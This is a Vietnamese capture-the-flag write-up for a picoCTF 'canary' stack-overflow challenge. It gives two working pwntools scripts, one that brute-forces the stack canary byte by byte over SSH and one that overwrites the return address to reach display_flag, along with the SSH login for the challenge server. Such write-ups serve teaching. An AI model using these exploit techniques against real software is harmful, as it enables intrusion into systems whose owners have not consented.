# Problem
## Canary
### Bài này là một dạng bài có gắn thêm canary để detect stack bị overflow.
### Chương trình cho phép chúng ta nhập độ dài chuỗi muốn nhập và nhập vào. Trong chương trình còn có function display_flag. có thể đoán được đây là function quan trọng dùng để in ra flag cho mình.

# Solution
## Bài này có cho Hint như sau: 
`Maybe there's a smart way to brute-force the canary?`
### Để giải quyết bài này chúng ta cần biết:
* Canary, vị trí nằm trong Stack
* offset và địa chỉ của hàm display_flag

Đầu tiên là tìm Canary:
Chúng ta sẽ dùng 1 chương trình `BruteForce cực mạnh` để lấy được Canary như sau:
```sh
from pwn import *
#offset -> ret : 52
sss = ssh(host = "2019shell1.picoctf.com",user= 'hazir',password ='2k4')

canary = ''
len_canary = 0
len = 33 #(32 + them 1 thang de bruteforce)
pl = "a"*32 #(Độ dài trước canary trong stack)
while len_canary < 4:
	value = 1
	while value < 256:
		s = sss.run("cd /problems/canary_5_f37171114d0d9fc71194842bb8b7bb34; ./vuln")
		#s = process("./vuln")
		len_tmp = len + len_canary
		s.sendline(str(len_tmp))
		s.sendline(pl +  chr(value))
		ret = s.recvall()
		log.info("ret >>> " + str(ret))
		if "Stack Smashing Detected" not in ret:
			pl= pl + chr(value)
			canary += chr(value)
			len_canary += 1
			break;
		s.close()
		value+=1
log.info("canary >> " + canary)
```

Sau khi chạy thì ta sẽ được canary là: `lV!)`

Sau đó chúng ta sẽ dùng brute force 1 lần nữa để lấy flag từ function display_flag.  Do trên server có dùng ASLR( Address Space Layout Randomize ) nên chúng ta sẽ dùng Brute thêm 1 lần nữa.

```sh
while True:
	s = sss.run("cd /problems/canary_5_f37171114d0d9fc71194842bb8b7bb34; ./vuln")
	#s = process("./vuln")
	#canary_local = 'ABCD'
	#pause()
	s.sendline("56")  # offset từ buffer đến ret
	pl = "a"*32 + canary + "a"*16 + p32(0x565557ed)
	s.sendline(pl)
	ret = s.recvall()
	log.info("ret >> " + ret)
	if "pico" in ret:
		break
```
Run chương trình lên, tùy vào nhân phẩm mà thời gian đợi sẽ lâu hay chậm. Nhưng cuối cùng thì flag vẫn phải có thôi. :3

`FLAG:` 